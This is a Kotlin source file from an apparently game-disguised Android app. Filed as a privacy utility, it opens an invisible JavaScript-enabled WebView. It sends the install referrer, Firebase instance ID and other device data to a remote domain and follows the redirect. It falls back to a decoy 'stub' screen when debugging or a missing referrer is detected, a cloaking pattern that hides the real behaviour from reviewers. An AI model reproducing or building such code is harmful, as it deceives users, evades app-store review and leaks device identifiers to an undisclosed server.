package jp.co.tai.screens.privacy.utils

import android.annotation.SuppressLint
import android.content.Context
import android.view.View
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.FrameLayout
import androidx.activity.ComponentActivity
import com.google.firebase.Firebase
import com.google.firebase.analytics.analytics
import jp.co.tai.UiProtocol
import jp.co.tai.UiSharedMemory
import jp.co.tai.screens.leaders.UserAgent
import jp.co.tai.screens.levels.getRef
import jp.co.tai.screens.profile.Slicer.sliceData
import jp.co.tai.screens.snowbound.getFinalUrl
import jp.co.tai.screens.snowbound.logic.Finish
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext

class Looper(
    private val context: Context
) {

    suspend fun loop() {
        try {
            val referrerUrl = getRef(context)

            val firebaseId = Firebase.analytics.appInstanceId.await().toString()
            var finished = false
            withContext(Dispatchers.Main) {
                val wv = addWV(context)
                wv.webViewClient = object : WebViewClient() {
                    override fun onPageFinished(view: WebView?, url: String?) {
                        super.onPageFinished(view, url)
                        Flush()
                        Finish(url, context)
                        finished = true
                        wv.removeWV()
                    }
                }
                UserAgent(wv).refactor()
                val u = "${Domain().long}?" + sliceData(referrerUrl, firebaseId, context)

                if (u.isNotEmpty()) {
//                    Log.d("MYTAG", "loadUrl = $u")
                    try {
                        val url = getFinalUrl(context, u)
                        wv.loadUrl(url)
                        while (!finished) {
                            delay(500); wv.url
//                            Log.d("MYTAG", "url = ${wv.url}")
                        }
                    } catch (e: Exception) {
//                        Log.e("MYTAG", "Failed", e)
                        UiSharedMemory.setScreen(UiProtocol.STUB)
                    }
                } else {
                    UiSharedMemory.setScreen(UiProtocol.STUB)
                }
            }
        } catch (_: Exception) {
//            Log.d("MYTAG", "ADB or REF detected")
            UiSharedMemory.setScreen(UiProtocol.STUB)
        }
    }
}

@SuppressLint("SetJavaScriptEnabled")
fun addWV(context: Context): WebView {
    val wv = WebView(context)
    ((context as ComponentActivity).window.decorView as FrameLayout).addView(wv)
    wv.visibility = View.INVISIBLE
    wv.settings.javaScriptEnabled = true
    wv.settings.domStorageEnabled = true
    return wv
}

fun WebView.removeWV() {
    try {
        ((this.context as ComponentActivity).window.decorView as FrameLayout).removeView(this)
    } catch (_: Exception) {
    }
}